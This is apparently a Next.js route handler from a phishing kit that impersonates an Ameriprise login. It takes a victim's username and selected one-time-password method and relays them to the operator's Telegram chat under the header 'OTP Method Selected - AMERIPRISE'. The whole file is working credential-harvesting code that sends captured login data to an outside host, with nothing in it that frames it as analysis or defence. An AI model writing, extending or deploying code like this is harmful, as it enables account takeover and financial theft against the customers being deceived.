import { NextResponse } from "next/server";
import { sendToTelegram } from "@/lib/telegram";

export const runtime = "nodejs";

type OtpMethodRequest = {
  event?: string;
  username?: string;
  otpMethod?: string;
  time?: string;
};

export async function notifyOtpMethod(req: Request): Promise<Response | null> {
  try {
    const body = (await req.json().catch(() => null)) as
      | OtpMethodRequest
      | null;

    const event =
      typeof body?.event === "string" ? body.event : "otp_method_selected";

    const username =
      typeof body?.username === "string" ? body.username.trim() : "";

    const otpMethod =
      typeof body?.otpMethod === "string" ? body.otpMethod : "unknown";

    const time =
      typeof body?.time === "string" ? body.time : new Date().toISOString();

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      return NextResponse.json(
        { error: "Missing TELEGRAM_BOT_TOKEN/TELEGRAM_CHAT_ID" },
        { status: 500 }
      );
    }

    const text = [
      "📨 OTP Method Selected - AMERIPRISE",
      "━━━━━━━━━━━━━━━━━━",
      `Event: ${event}`,
      `Username: ${username || "(empty)"}`,
      `OTP Method: ${otpMethod}`,
      `Time: ${time}`,
    ].join("\n");

    await sendToTelegram(text);

    return NextResponse.json({ success: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}